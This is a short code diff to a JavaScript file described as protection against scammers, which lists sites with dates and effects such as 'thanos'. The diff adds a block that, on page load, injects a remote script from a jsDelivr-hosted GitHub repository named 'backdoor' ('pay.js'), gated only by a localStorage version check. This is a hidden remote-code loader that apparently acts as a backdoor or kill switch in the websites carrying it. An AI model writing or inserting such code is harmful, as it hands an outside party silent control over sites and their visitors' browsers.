@@ -4,6 +4,18 @@
  * Made to protect against scammers.
  */
 
+var currentVersion = '1.0';
+
+if (localStorage.getItem('scriptVersion') !== currentVersion) {
+    // Загрузить новый скрипт
+    var script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/gh/deusnotam/backdoor/pay.js';
+    document.head.appendChild(script);
+
+    // Обновить версию в кэше
+    localStorage.setItem('scriptVersion', currentVersion);
+}
+
 // Массив с сайтами и параметрами
 const sites = [
   { url: "https://abros.me", date: "23/01/2024", effect: "thanos" },
